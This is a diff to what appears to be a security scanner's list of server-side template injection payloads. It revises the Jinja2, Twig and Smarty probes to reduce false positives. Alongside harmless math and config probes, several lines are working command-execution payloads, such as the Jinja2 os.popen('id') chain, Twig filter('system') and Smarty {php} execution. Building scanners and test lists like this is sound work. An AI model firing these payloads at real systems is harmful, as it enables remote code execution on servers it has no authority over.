@@ -1,18 +1,26 @@
-# SSTI payloads - template injection
+# SSTI payloads - template injection (IMPROVED - avoid false positives)
+# Complex math expressions (less common than 49)
+{{7*7*7}}
+{{199*3}}
+{{1337+1338}}
+{{13*37}}
+{{73*73}}
+
+# Jinja2 (Python) - Advanced detection
+{{''.__class__.__mro__[1].__subclasses__()}}
+{{config.items()}}
+{{config}}
+{{range(1,10)|join(',')}}
+{{'SSTI'*10}}
+{{request.application.__class__.__name__}}
+{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
+
 # Twig (PHP)
-{{7*7}}
 {{_self}}
 {{_self.env.display("test")}}
 {{_self.env.getRuntime("Twig\\Runtime\\EscaperRuntime")}}
 {{['id']|filter('system')}}
 {{['ls']|filter('system')}}
-
-# Jinja2 (Python)
-{{7*7}}
-{{config}}
-{{config.items()}}
-{{''.__class__.__mro__[1].__subclasses__()}}
-{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
 
 # Smarty (PHP)
 {php}echo `id`;{/php}
